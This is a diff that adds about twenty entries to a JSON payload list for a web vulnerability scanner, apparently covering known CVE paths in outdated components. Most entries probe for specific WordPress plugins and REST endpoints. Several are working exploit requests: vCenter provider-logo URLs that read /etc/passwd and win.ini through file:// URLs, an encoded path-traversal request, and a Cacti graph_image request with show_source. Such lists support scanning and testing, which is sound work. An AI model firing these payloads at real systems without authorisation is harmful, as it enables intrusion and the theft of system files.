@@ -29159,5 +29159,236 @@
       "expected_status_code": 200,
       "success_regex": "version|vulnerable"
     }
+  },
+  {
+    "payload_id": "OWP-474754",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Linux",
+    "injection_point": "path_parameter",
+    "payload_string": "/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///etc/passwd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474755",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Windows",
+    "injection_point": "path_parameter",
+    "payload_string": "/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///c%3a/windows/win.ini",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474756",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Linux",
+    "injection_point": "path_parameter",
+    "payload_string": "/vsphere-client/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///etc/passwd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474757",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Windows",
+    "injection_point": "path_parameter",
+    "payload_string": "/vsphere-client/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///c%3a/windows/win.ini",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474758",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-json/yoast/v1/get_head?url=/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474759",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/plugins/kirki/readme.txt",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474760",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/bird?q=x",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474761",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/traceroute?q=--help",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474762",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "GraphQL",
+    "injection_point": "path_parameter",
+    "payload_string": "/actions/graphql/api",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474763",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "GraphQL",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/plugins/wp-graphql-content-blocks/readme.txt",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474764",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-json/ultimate-security-for-woocommerce/v1/plugin-info",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474765",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/?rest_route=/ultimate-security-for-woocommerce/v1/plugin-info",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474766",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-json/ultimate-security-for-woocommerce/v1/options",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474767",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/?rest_route=/ultimate-security-for-woocommerce/v1/options",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474768",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/assets/images/%2e%2e/%2e%2e/vendor/symfony/error-handler/Resources/assets/images/symfony-logo.svg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474769",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/v1/onboarding/config",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474770",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/backend/v1/onboarding/config",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474771",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/v1/onboarding/config?token=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474772",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/backend/v1/onboarding/config?token=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474773",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-login.php?action=members_rescue",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474774",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/graph_image.php?local_graph_id=1&rra_id=0&show_source=1&graph_theme=midwinter/.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
   }
 ]
